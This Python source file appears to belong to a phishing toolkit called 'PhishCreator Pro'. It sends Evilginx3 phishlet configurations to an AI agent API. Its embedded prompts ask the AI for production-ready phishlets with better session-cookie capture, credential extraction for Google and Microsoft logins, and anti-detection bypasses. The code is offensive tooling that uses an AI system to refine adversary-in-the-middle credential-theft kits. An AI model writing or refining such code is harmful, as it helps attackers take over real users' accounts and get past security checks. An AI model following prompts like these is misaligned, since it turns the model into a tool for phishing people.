#!/usr/bin/env python3
"""
AI-Assisted Phishlet Refiner
Uses Manus AI API to refine and improve phishlets
"""

import os
import json
import requests
from typing import Dict, List, Optional
from dataclasses import dataclass


@dataclass
class AIRefinementResult:
    """Result of AI-assisted refinement"""
    success: bool
    task_id: Optional[str] = None
    task_url: Optional[str] = None
    share_url: Optional[str] = None
    refined_phishlet: Optional[str] = None
    analysis: str = ""
    suggestions: List[str] = None
    error: Optional[str] = None
    
    def __post_init__(self):
        if self.suggestions is None:
            self.suggestions = []


class AIPhishletRefiner:
    """
    Uses Manus AI API to refine phishlets
    Leverages AI for complex pattern recognition and optimization
    """

    # Default API endpoint - can be overridden via env var or constructor
    DEFAULT_API_BASE = "https://api.manus.im/v1"

    def __init__(self, api_key: Optional[str] = None, api_base: Optional[str] = None):
        """
        Initialize AI refiner

        Args:
            api_key: Manus API key (or use MANUS_API_KEY env var)
            api_base: API base URL (or use MANUS_API_BASE env var, defaults to https://api.manus.im/v1)
        """
        self.api_key = api_key or os.environ.get('MANUS_API_KEY')
        self.api_base = api_base or os.environ.get('MANUS_API_BASE', self.DEFAULT_API_BASE)
        if not self.api_key:
            raise ValueError("Manus API key required. Set MANUS_API_KEY environment variable or pass api_key parameter.")
    
    def refine_phishlet(self, phishlet_yaml: str, traffic_data: Optional[Dict] = None,
                       test_results: Optional[Dict] = None) -> AIRefinementResult:
        """
        Refine phishlet using AI
        
        Args:
            phishlet_yaml: Current phishlet YAML
            traffic_data: Optional traffic analysis data
            test_results: Optional test results for learning
        
        Returns:
            AIRefinementResult with refinement details
        """
        # Build comprehensive prompt for AI
        prompt = self._build_refinement_prompt(phishlet_yaml, traffic_data, test_results)
        
        # Create Manus task
        try:
            task_response = self._create_manus_task(prompt)
            
            if not task_response.get('success'):
                return AIRefinementResult(
                    success=False,
                    error=task_response.get('error', 'Failed to create Manus task')
                )
            
            return AIRefinementResult(
                success=True,
                task_id=task_response.get('task_id'),
                task_url=task_response.get('task_url'),
                share_url=task_response.get('share_url'),
                analysis="AI refinement task created. Check task URL for results."
            )
        
        except Exception as e:
            return AIRefinementResult(
                success=False,
                error=str(e)
            )

    def create_task(self, prompt: str) -> AIRefinementResult:
        """Create a Manus task from a custom prompt."""
        try:
            task_response = self._create_manus_task(prompt)
            if not task_response.get('success'):
                return AIRefinementResult(
                    success=False,
                    error=task_response.get('error', 'Failed to create Manus task')
                )

            return AIRefinementResult(
                success=True,
                task_id=task_response.get('task_id'),
                task_url=task_response.get('task_url'),
                share_url=task_response.get('share_url'),
                analysis="AI update task created. Check task URL for results."
            )
        except Exception as e:
            return AIRefinementResult(
                success=False,
                error=str(e)
            )
    
    def _build_refinement_prompt(self, phishlet_yaml: str,
                                traffic_data: Optional[Dict],
                                test_results: Optional[Dict]) -> str:
        """Build comprehensive prompt for AI refinement"""
        
        prompt = f"""# Phishlet Refinement Task

You are an expert in Evilginx3 phishlet development. Analyze and refine the following phishlet configuration.

## Current Phishlet YAML

```yaml
{phishlet_yaml}
```

## Analysis Requirements

1. **Validate Structure**: Check if all required sections are present and correctly formatted
2. **Optimize Proxy Hosts**: Ensure all necessary domains are included
3. **Improve Sub-Filters**: Add missing hostname rewrites and anti-detection bypasses
4. **Enhance Cookie Capture**: Verify auth_tokens cover all session cookies
5. **Refine Credentials**: Optimize credential extraction patterns
6. **JavaScript Injection**: Determine if JS injection is needed for anti-detection
7. **Force POST**: Check if force_post parameters are needed

"""
        
        # Add traffic data context if available
        if traffic_data:
            prompt += f"""
## Traffic Analysis Data

The phishlet was generated from the following traffic analysis:

- **Unique Hosts**: {len(traffic_data.get('unique_hosts', []))}
- **Form Submissions**: {len(traffic_data.get('form_submissions', []))}
- **Detected Proxy Hosts**: {len(traffic_data.get('detected_proxy_hosts', []))}
- **Detected Auth Tokens**: {len(traffic_data.get('detected_auth_tokens', []))}

### Detected Hosts
{json.dumps(traffic_data.get('unique_hosts', []), indent=2)}

### Detected Cookies
{json.dumps([token.get('keys', []) for token in traffic_data.get('detected_auth_tokens', [])], indent=2)}
"""
        
        # Add test results if available
        if test_results:
            prompt += f"""
## Test Results

The phishlet was tested with the following results:

- **Success**: {test_results.get('success', False)}
- **Credential Capture**: {test_results.get('credential_capture', False)}
- **Cookie Capture**: {test_results.get('cookie_capture', False)}
- **Errors**: {json.dumps(test_results.get('errors', []), indent=2)}
- **Missing Hosts**: {json.dumps(test_results.get('missing_hosts', []), indent=2)}
- **Missing Cookies**: {json.dumps(test_results.get('missing_cookies', []), indent=2)}

### Improvement Priorities

Based on test results, focus on:
1. Adding missing proxy hosts
2. Capturing missing cookies
3. Fixing identified errors
"""
        
        prompt += """
## Output Requirements

Provide:

1. **Refined Phishlet YAML**: Complete, production-ready phishlet
2. **Analysis Report**: Detailed explanation of changes made
3. **Confidence Score**: Rate confidence in the refined phishlet (0-100%)
4. **Testing Recommendations**: Specific tests to validate the phishlet
5. **Known Limitations**: Any potential issues or edge cases

## Important Notes

- Ensure compatibility with Evilginx3 version 3.3.0+
- Use `{hostname_regexp}` for dynamic hostname rewriting
- Always include `.*,regexp` in auth_tokens as a safety net
- For complex auth flows (Google, Microsoft), use regex-based credential extraction
- Add anti-detection bypasses for common security checks

Generate the refined phishlet now.
"""
        
        return prompt
    
    def _create_manus_task(self, prompt: str) -> Dict:
        """
        Create a Manus AI task
        
        Args:
            prompt: Task prompt
        
        Returns:
            Dictionary with task details
        """
        base_headers = {
            'Content-Type': 'application/json'
        }
        
        payload = {
            'prompt': prompt,
            'metadata': {
                'type': 'phishlet_refinement',
                'tool': 'PhishCreator Pro'
            }
        }
        
        def looks_like_jwt(token: Optional[str]) -> bool:
            if not token:
                return False
            return token.count('.') >= 2

        def extract_error_message(resp: requests.Response) -> str:
            try:
                data = resp.json()
                if isinstance(data, dict):
                    return str(data.get('error') or data.get('message') or data)
                return str(data)
            except Exception:
                return resp.text or f"HTTP {resp.status_code}"

        def post_with_headers(extra_headers: Dict[str, str]) -> requests.Response:
            headers = dict(base_headers)
            headers.update(extra_headers)
            return requests.post(
                f'{self.api_base}/tasks',
                headers=headers,
                json=payload,
                timeout=30
            )

        token_is_jwt = looks_like_jwt(self.api_key)
        primary_headers = {'Authorization': f'Bearer {self.api_key}'} if token_is_jwt else {'X-API-Key': self.api_key}
        fallback_headers = {'X-API-Key': self.api_key} if token_is_jwt else {'Authorization': f'Bearer {self.api_key}'}

        response = post_with_headers(primary_headers)

        if response.status_code in (401, 403):
            error_msg = extract_error_message(response).lower()
            if not token_is_jwt or 'invalid token' in error_msg or 'segment' in error_msg or 'jwt' in error_msg:
                response = post_with_headers(fallback_headers)
        
        if response.status_code == 200 or response.status_code == 201:
            data = response.json()
            return {
                'success': True,
                'task_id': data.get('id'),
                'task_url': data.get('url'),
                'share_url': data.get('share_url')
            }
        else:
            error_msg = extract_error_message(response)
            return {
                'success': False,
                'error': f"API request failed: {response.status_code} - {error_msg}"
            }
    
    def get_task_result(self, task_id: str) -> Dict:
        """
        Get result of a Manus task
        
        Args:
            task_id: Task ID
        
        Returns:
            Dictionary with task result
        """
        headers = {
            'Authorization': f'Bearer {self.api_key}'
        }
        
        response = requests.get(
            f'{self.api_base}/tasks/{task_id}',
            headers=headers,
            timeout=30
        )
        
        if response.status_code == 200:
            return response.json()
        else:
            return {
                'error': f"Failed to get task result: {response.status_code}"
            }
    
    def quick_validate(self, phishlet_yaml: str) -> Dict:
        """
        Quick validation without full refinement
        
        Args:
            phishlet_yaml: Phishlet YAML to validate
        
        Returns:
            Dictionary with validation results
        """
        prompt = f"""Quickly validate this Evilginx3 phishlet and identify any critical issues:

```yaml
{phishlet_yaml}
```

Provide:
1. Critical issues (if any)
2. Warnings (if any)
3. Overall assessment (valid/needs_fixes/invalid)
4. Quick fix suggestions

Keep response concise.
"""
        
        try:
            task_response = self._create_manus_task(prompt)
            return task_response
        except Exception as e:
            return {
                'success': False,
                'error': str(e)
            }


def refine_with_ai(phishlet_yaml: str, api_key: Optional[str] = None,
                  traffic_data: Optional[Dict] = None,
                  test_results: Optional[Dict] = None) -> AIRefinementResult:
    """
    Convenience function to refine phishlet with AI
    
    Args:
        phishlet_yaml: Phishlet YAML
        api_key: Manus API key
        traffic_data: Optional traffic data
        test_results: Optional test results
    
    Returns:
        AIRefinementResult
    """
    refiner = AIPhishletRefiner(api_key)
    return refiner.refine_phishlet(phishlet_yaml, traffic_data, test_results)
